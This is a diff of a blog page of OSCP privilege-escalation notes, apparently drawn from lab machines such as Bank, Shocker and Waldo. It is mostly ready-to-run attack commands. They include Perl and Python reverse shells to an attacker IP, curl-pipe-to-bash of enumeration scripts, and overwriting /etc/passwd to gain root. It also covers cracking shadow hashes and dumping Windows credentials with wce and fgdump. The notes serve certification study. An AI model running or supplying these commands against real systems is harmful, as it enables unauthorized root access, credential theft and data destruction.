@@ -35,38 +35,45 @@
         </address>
 <p>In <a href="/category/certifications.html">Certifications</a>.</p>
 <p>tags: <a href="/tag/oscp.html">OSCP</a> </p>
-</footer><!-- /.post-info --><div class="highlight"><pre><span></span><code><span class="n">privesc_linux</span>
-<span class="n">UPGRADE</span> <span class="n">SHELL</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import pty; pty.spawn(&quot;bin/bash&quot;)&#39;</span>
-<span class="n">ctrl</span><span class="o">-</span><span class="n">Z</span>
-<span class="n">stty</span> <span class="n">raw</span> <span class="o">-</span><span class="n">echo</span>
-<span class="n">fg</span>
+</footer><!-- /.post-info --><div class="highlight"><pre><span></span><code>privesc_linux
+UPGRADE SHELL python -c <span class="s1">&#39;import pty; pty.spawn(&quot;bin/bash&quot;)&#39;</span>
+ctrl-Z
+stty raw -echo
+<span class="nb">fg</span>
 </code></pre></div>
 
 <p>Enumerate and run this:</p>
-<p><code>which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2&gt;/dev/null</code></p>
+<div class="highlight"><pre><span></span><code>which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp <span class="m">2</span>&gt;/dev/null
+</code></pre></div>
+
 <p>If you don’t see a compiler such as GCC, you know it’s probably not going to be a kernel exploit. So enumerate and use
 LinEnum.sh or Linuxprivescchecker.py. I found on one of my 20 point boxes it only perl and wget, so I was looking for priv esc
 related to perl. The other 20 pointer had GCC, so I googled a linux exploit, 2 minutes later I am root.
-BY HAND 
-1. sudo -l # view users rights has to be tried first for all linux privesc
-2. rw on /etc/passwd → echo root::0:0:root:/root:/bin/bash &gt; /etc/passwd → su
-3. bash_history
-4. find / -perm -4000 2&gt;/dev/null # SUID files - detect by date?
-5. Do all cronjobs look normal and do you have write access to any??
-6. ps aux | grep root == john mysql -u root
-7. If webserver poke around database
-8. Look at original nmap scan for other shite running (nmap localhost)</p>
-<div class="highlight"><pre><span></span><code><span class="err">sudo -u anotheruser command run sommand as another user</span>
-<span class="err">sudo -u scriptmanager bash -i #run shell as user scriptmanager</span>
-<span class="err">which awk perl python ruby gcc cc vi vim nmap find netcat nc wget curl tftp ftp 2&gt;/dev/null</span>
+BY HAND </p>
+<ol>
+<li>sudo -l # view users rights has to be tried first for all linux privesc</li>
+<li>rw on /etc/passwd → echo root::0:0:root:/root:/bin/bash &gt; /etc/passwd → su</li>
+<li>bash_history</li>
+<li>find / -perm -4000 2&gt;/dev/null # SUID files - detect by date?</li>
+<li>Do all cronjobs look normal and do you have write access to any??</li>
+<li>ps aux | grep root == john mysql -u root</li>
+<li>If webserver poke around database</li>
+<li>Look at original nmap scan for other shite running (nmap localhost)</li>
+</ol>
+<div class="highlight"><pre><span></span><code>sudo -u anotheruser _command <span class="c1"># run _command as another user</span>
+sudo -u scriptmanager bash -i <span class="c1"># run shell as user scriptmanager</span>
+which awk perl python ruby gcc cc vi vim nmap find netcat nc wget curl tftp ftp <span class="m">2</span>&gt;/dev/null
 </code></pre></div>
 
-<p>DOWNLOAD ALL LINUX ENUM FILES TO VICTIM cd /opt/linux_privesc
+<p>DOWNLOAD ALL LINUX ENUM FILES TO VICTIM </p>
+<div class="highlight"><pre><span></span><code><span class="nb">cd</span> /opt/linux_privesc
 python -m SimpleHTTPServer
-wget -r 10.10.14.7:8000
-curl 10.10.14.7/LinEnum | bash # pipe into bash
-or save to victim
-linEnum.sh has a -t flag for thorough!!
+wget -r <span class="m">10</span>.10.14.7:8000
+curl <span class="m">10</span>.10.14.7/LinEnum <span class="p">|</span> bash <span class="c1"># pipe into bash</span>
+</code></pre></div>
+
+<p>or save to victim</p>
+<p>linEnum.sh has a -t flag for thorough!!
 make a thorough linEnum script bu putting thorough = 1 at top of script
 KERNEL EXPLOITS i686 = 32bit
 x86_64 = 64bit
@@ -75,102 +82,137 @@ Get Linux version from Apache version etc... Launchpad?
 linux exploit suggester
 the exploit will give linux version + exploitable file
 check your own file version
-eg
-ldd --version
+eg</p>
+<div class="highlight"><pre><span></span><code>ldd --version
 cat /etc/lsb-release
-Can ignore warnings on gcc compiles
+</code></pre></div>
+
+<p>Can ignore warnings on gcc compiles
 LINUX VERSIONS
-ubuntu 2.2.22 apache → launchpad link → prcise
-Google ubuntu releases wiki.ubuntu.com/Releases → End of Lifes?
-nmap --script vuln -oA nmap/vulns 10.10.10.79
-Freebsd uses csh shell
+ubuntu 2.2.22 apache ... launchpad link ... precise
+Google ubuntu releases wiki.ubuntu.com/Releases → End of Lifes?</p>
+<div class="highlight"><pre><span></span><code>nmap --script vuln -oA nmap/vulns <span class="m">10</span>.10.10.79
+</code></pre></div>
+
+<p>Freebsd uses csh shell
 LINUX PASSWORDS unshadow passwd.txt shadow.txt &gt; unshadowed.txt
 john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
 42/67
-WRITABLE /etc/passwd (Bank) Create encrypted password and place in passwd file
-openssl passwd --help
+WRITABLE /etc/passwd (Bank) Create encrypted password and place in passwd file</p>
+<div class="highlight"><pre><span></span><code>openssl passwd --help
 openssl passwd dan
 dfVJQnZOraiAw
-openssl passwd -1 dan # specifies md5
+openssl passwd -1 dan <span class="c1"># specifies md5</span>
 vi /etc/passwd
-replace
-root:x:0:0:root:/root:/bin/bash
-with
-root:dfVJQnZOraiAw:0:0:root:/root:/bin/bash
+</code></pre></div>
+
+<p>replace</p>
+<div class="highlight"><pre><span></span><code>root:x:0:0:root:/root:/bin/bash
+</code></pre></div>
+
+<p>with</p>
+<div class="highlight"><pre><span></span><code>root:dfVJQnZOraiAw:0:0:root:/root:/bin/bash
 su root
 Password: dan
-SUID (Bank) find / -perm -4000 2&gt;/dev/null
+SUID <span class="o">(</span>Bank<span class="o">)</span> find / -perm -4000 <span class="m">2</span>&gt;/dev/null
 /var/htb/bin/emergency
-$ ls -la /var/htb/bin/emergency
--rwsr-xr-x 1 root root 112204 Jun 14 2017 /var/htb/bin/emergency
-Just run the binary and gain root
-/var/htb/bin/emergency
-That was simple (will often need to edit binary)
-ESCALATE VIA MYSQL ROOT credentials → go into mysql as root then drop ito a shell to pwn box
-mysql -u root -p
-Enter password: !@#S3cur3P4ssw0rd!@#
-Create shell in mysql
-! /bin/sh
-DIDNT ESCALATE
-sudo -l sudo -l
-User shelly may run the following commands on Shocker:
-(root) NOPASSWD: /usr/bin/perl
-Get the pentest monkey perl shell
-Important to add sudo before
-sudo /usr/bin/perl -e 'use Socket;$i="10.10.14.7";
-$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))
-{open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
-A cronjob (of sorts) test.py owned by us (we are scriptmanager). But note the output (test.txt) is root.
+ls -la /var/htb/bin/emergency
+-rwsr-xr-x <span class="m">1</span> root root <span class="m">112204</span> Jun <span class="m">14</span> <span class="m">2017</span> /var/htb/bin/emergency
+</code></pre></div>
+
+<p>Just run the binary and gain root</p>
+<div class="highlight"><pre><span></span><code>/var/htb/bin/emergency
+</code></pre></div>
+
+<p>That was simple (will often need to edit binary)
+ESCALATE VIA MYSQL ROOT credentials ... go into mysql as root then drop ito a shell to pwn box</p>
+<div class="highlight"><pre><span></span><code>mysql -u root -p
+Enter password: !@S3cur3P4ssw0rd!@
+</code></pre></div>
+
+<p>Create shell in mysql</p>
+<div class="highlight"><pre><span></span><code><span class="se">\!</span> /bin/sh
+</code></pre></div>
+
+<p>DIDNT ESCALATE</p>
+<div class="highlight"><pre><span></span><code>sudo -l sudo -l
+</code></pre></div>
+
+<p>User shelly may run the following commands on Shocker:</p>
+<div class="highlight"><pre><span></span><code><span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/perl
+</code></pre></div>
+
+<p>Get the pentest monkey perl shell
+Important to add sudo before</p>
+<div class="highlight"><pre><span></span><code>sudo /usr/bin/perl -e <span class="s1">&#39;use Socket;$i=&quot;10.10.14.7&quot;;</span>
+<span class="s1">$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))</span>
+<span class="s1">{open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;</span>
+</code></pre></div>
+
+<p>A cronjob (of sorts) test.py owned by us (we are scriptmanager). But note the output (test.txt) is root.
 Goody gumdrops.
-Put in a new test.py.
-import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.7",
-4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
-Open listener on KALI: nc -nlvp 4444
-Serve it it to victim's scripts folder
-Let the cronjob run → shell
+Put in a new test.py.</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span><span class="nn">subprocess</span><span class="o">,</span><span class="nn">os</span><span class="p">;</span><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">);</span><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s2">&quot;10.10.14.7&quot;</span><span class="p">,</span>
+<span class="mi">4444</span><span class="p">));</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">);</span> <span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">);</span> <span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">);</span><span class="n">p</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">([</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="s2">&quot;-i&quot;</span><span class="p">]);</span>
+</code></pre></div>
+
+<p>Open listener on KALI: </p>
+<div class="highlight"><pre><span></span><code>nc -nlvp <span class="m">4444</span>
+</code></pre></div>
+
+<p>Serve it it to victim's scripts folder
+Let the cronjob run shell
 43/67
-RESTRICTED BASH To view what we CAN run
-monitor@waldo:~$ echo $PATH
+RESTRICTED BASH To view what we CAN run</p>
+<h3>ON WALDO</h3>
+<div class="highlight"><pre><span></span><code><span class="nb">echo</span> <span class="nv">$PATH</span>
 /home/monitor/bin:/home/monitor/app-dev:/home/monitor/app-dev/v0.1
 ls /home/monitor/bin
 ls most red rnano
 ls -la /home/monitor/app-dev
-total 2236
-drwxrwx--- 3 app-dev monitor 4096 May 3 2018 .
-drwxr-x--- 5 root monitor 4096 Jul 24 2018 ..
--rwxrwx--- 1 app-dev monitor 13704 Jul 24 2018 logMonitor
-rwx-able if we are in monitor group?
+total <span class="m">2236</span>
+drwxrwx--- <span class="m">3</span> app-dev monitor <span class="m">4096</span> May <span class="m">3</span> <span class="m">2018</span> .
+drwxr-x--- <span class="m">5</span> root monitor <span class="m">4096</span> Jul <span class="m">24</span> <span class="m">2018</span> ..
+-rwxrwx--- <span class="m">1</span> app-dev monitor <span class="m">13704</span> Jul <span class="m">24</span> <span class="m">2018</span> logMonitor
+<span class="c1"># rwx-able if we are in monitor group?</span>
 rnano /etc/group
-monitor:x:1001: ← yes
-We will copy /bin/bash and paste it over logMonitor
-red /bin/bash ← restricted edit
-1099016
+monitor:x:1001: <span class="c1"># yes</span>
+<span class="c1"># We will copy /bin/bash and paste it over logMonitor</span>
+red /bin/bash <span class="c1"># restricted edit</span>
+<span class="m">1099016</span>
 w app-dev/logMonitor &lt;- write to logMonitorcd ~
-1099016
+<span class="m">1099016</span>
 q
 logMonitor
-tmp.tUiSCVyRTR: dircolors: command not found
-We now have /bin/bash BUT we can still only do whats in our path. BUT... we can echo a normal path (from kali) and set it on
-Waldo
-ON KALI
-echo $PATH
+tmp.tUiSCVyRTR: dircolors: <span class="nb">command</span> not found
+</code></pre></div>
+
+<p>We now have /bin/bash BUT we can still only do whats in our path. BUT... we can echo a normal path (from kali) and set it on Waldo</p>
+<h3>ON KALI</h3>
+<div class="highlight"><pre><span></span><code><span class="nb">echo</span> <span class="nv">$PATH</span>
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/go/bin:/root/go-workspace/bin
-ON WALDO
-export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/go/bin:/root/go-workspace/bin
-GET LINENUM WITH CURL
-root@kali:/opt/linux_privesc# python -m SimpleHTTPServer
-Serving HTTP on 0.0.0.0 port 8000 ...
-curl 10.10.14.11:8000/linEnumThorough.sh | bash
-[+] Files with POSIX capabilities set:
-/usr/bin/tac = cap_dac_read_search+ei
-/home/monitor/app-dev/v0.1/logMonitor-0.1 = cap_dac_read_search+ei
-[+] Capabilities associated with the current user:
+</code></pre></div>
+
+<h3>ON WALDO</h3>
+<div class="highlight"><pre><span></span><code><span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/go/bin:/root/go-workspace/bin
+</code></pre></div>
+
+<h3>ON KALI</h3>
+<p>Get <code>linenum</code> with <code>curl</code></p>
+<div class="highlight"><pre><span></span><code>python -m SimpleHTTPServer
+Serving HTTP on <span class="m">0</span>.0.0.0 port <span class="m">8000</span> ...
+curl <span class="m">10</span>.10.14.11:8000/linEnumThorough.sh <span class="p">|</span> bash
+<span class="o">[</span>+<span class="o">]</span> Files with POSIX capabilities set:
+/usr/bin/tac <span class="o">=</span> cap_dac_read_search+ei
+/home/monitor/app-dev/v0.1/logMonitor-0.1 <span class="o">=</span> cap_dac_read_search+ei
+<span class="o">[</span>+<span class="o">]</span> Capabilities associated with the current user:
 cap_dac_read_search ←
-[+] Permissions of files with the same capabilities associated with the current user:
--rwxr-xr-x 1 root root 39752 Feb 22 2017 /usr/bin/tac
+<span class="o">[</span>+<span class="o">]</span> Permissions of files with the same capabilities associated with the current user:
+-rwxr-xr-x <span class="m">1</span> root root <span class="m">39752</span> Feb <span class="m">22</span> <span class="m">2017</span> /usr/bin/tac
 man capabilities
 CAP_DAC_READ_SEARCH
-* Bypass file read permission checks and directory read and execute permission checks;</p>                </article>
+* Bypass file <span class="nb">read</span> permission checks and directory <span class="nb">read</span> and execute permission checks<span class="p">;</span>
+</code></pre></div>                </article>
             </aside><!-- /#featured -->
                 <section id="content" class="body">
                     <h1>Other articles</h1>
@@ -194,18 +236,20 @@ CAP_DAC_READ_SEARCH
         </address>
 <p>In <a href="/category/certifications.html">Certifications</a>.</p>
 <p>tags: <a href="/tag/oscp.html">OSCP</a> </p>
-</footer><!-- /.post-info -->                <div class="highlight"><pre><span></span><code><span class="err">icacls scsiaccess.exe</span>
-<span class="err">...</span>
-<span class="c">Everyone: (I)(F)</span>
+</footer><!-- /.post-info -->                <div class="highlight"><pre><span></span><code><span class="n">icacls</span> <span class="n">scsiaccess</span><span class="p">.</span><span class="n">exe</span>
+<span class="p">...</span>
+<span class="c"># Everyone: (I)(F)</span>
 </code></pre></div>
 
-<p>crosscompile useradd.c
-i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c
-wce -w
-fgdump.exe
-type 127.0.0.1.pwdump
-john --wordlist=/usr/share/wordlists/rockyou.txt 127.0.0.1.pwdump
-Is there python on dev windows machine
+<div class="highlight"><pre><span></span><code><span class="n">crosscompile</span> <span class="n">useradd</span><span class="p">.</span><span class="n">c</span>
+<span class="n">i686-w64-mingw32-gcc</span> <span class="n">-o</span> <span class="n">scsiaccess</span><span class="p">.</span><span class="n">exe</span> <span class="n">useradd</span><span class="p">.</span><span class="n">c</span>
+<span class="n">wce</span> <span class="n">-w</span>
+<span class="n">fgdump</span><span class="p">.</span><span class="n">exe</span>
+<span class="nb">type </span><span class="n">127</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">pwdump</span>
+<span class="n">john</span> <span class="p">-</span><span class="n">-wordlist</span><span class="p">=/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">wordlists</span><span class="p">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span> <span class="n">127</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">pwdump</span>
+</code></pre></div>
+
+<p>Is there python on dev windows machine
 Use pyinstaller on dev windows machine …</p>
                 <a class="readmore" href="/windows-privilege-escalation.html">read more</a>
                 </div><!-- /.entry-content -->
@@ -214,7 +258,7 @@ Use pyinstaller on dev windows machine …</p>
             <li><article class="hentry">
                 <header>
                     <h1><a href="/linux-buffer-overflow.html" rel="bookmark"
-                           title="Permalink to Linux Buffer Overflow">Linux Buffer Overflow</a></h1>
+                           title="Permalink to Linux Buffer Overflow (Crossfire)">Linux Buffer Overflow (Crossfire)</a></h1>
                 </header>
 
                 <div class="entry-content">
@@ -228,12 +272,12 @@ Use pyinstaller on dev windows machine …</p>
         </address>
 <p>In <a href="/category/certifications.html">Certifications</a>.</p>
 <p>tags: <a href="/tag/oscp.html">OSCP</a> </p>
-</footer><!-- /.post-info -->                <h1>Linux Buffer Overflow (Crossfire)</h1>
-<p>Download a version of the vulnerable app Crossfire</p>
-<h3>Setup safe environment: iptables only allow traffic from loopback interface=targetip</h3>
-<p>iptables –A, -p, -d, -j # Append, protocol, destination, jump
-crossfire listens on port 13327
-iptables -A INPUT -p tcp --destination-port 13327 ! -d 127.0.0.1 -j …</p>
+</footer><!-- /.post-info -->                <p>Download a version of the vulnerable app Crossfire</p>
+<h2>Setup safe environment: iptables only allow traffic from loopback interface=targetip</h2>
+<div class="highlight"><pre><span></span><code>iptables –A, -p, -d, -j <span class="c1"># Append, protocol, destination, jump</span>
+crossfire listens on port <span class="m">13327</span>
+iptables -A INPUT -p tcp --destination-port <span class="m">13327</span> <span class="se">\!</span> -d <span class="m">127</span>.0.0.1 -j DROP
+iptables -A INPUT …</code></pre></div>
                 <a class="readmore" href="/linux-buffer-overflow.html">read more</a>
                 </div><!-- /.entry-content -->
             </article></li>
